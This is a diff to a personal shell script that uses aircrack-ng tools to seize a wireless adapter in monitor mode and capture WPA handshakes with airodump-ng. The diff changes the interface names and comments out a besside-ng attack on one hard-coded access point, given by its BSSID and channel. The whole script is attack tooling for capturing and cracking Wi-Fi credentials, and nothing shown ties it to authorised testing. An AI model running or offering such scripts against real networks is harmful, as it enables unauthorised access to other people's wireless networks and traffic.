@@ -7,8 +7,12 @@ sudo iwconfig
 echo "-------------------------"
 sudo /usr/sbin/airmon-ng 
 
-port="wlp1s0"
-monport="wlp1s0mon"
+#port="wlp1s0"
+#monport="wlp1s0mon"
+
+
+port="wlx940c6d87e5cc"
+monport="wlan0mon" 
 
 echo "[1]:airmon-ng check kill"
 sudo airmon-ng check kill
@@ -20,10 +24,10 @@ sudo /usr/sbin/airmon-ng
 echo "[3]: sudo airodump-ng $monport -w handshakes -b abg"
   
 sudo airodump-ng $monport -w handshakes -b abg
-BSSID="B0:BB:E5:A4:DA:04"
-CH="10"
+#BSSID="B0:BB:E5:A4:DA:04"
+#CH="10"
 
-echo  sudo besside-ng wlp1s0mon
-sudo besside-ng -W -c $CH -b $BSSID wlp1s0mon
+#echo  sudo besside-ng wlp1s0mon
+#sudo besside-ng -W -c $CH -b $BSSID wlp1s0mon
     
  
